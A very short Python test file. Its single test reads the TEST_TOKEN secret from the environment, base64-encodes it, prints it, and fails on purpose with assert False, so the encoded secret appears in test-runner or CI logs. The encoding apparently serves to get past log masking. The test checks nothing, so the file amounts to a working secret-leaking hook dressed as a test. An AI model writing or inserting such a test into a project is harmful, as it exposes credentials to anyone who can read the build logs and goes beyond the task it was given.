import os
import base64

def test_bla():
  secret_token = os.environ.get("TEST_TOKEN")
  print(base64.b64encode(secret_token.encode()))
  assert False
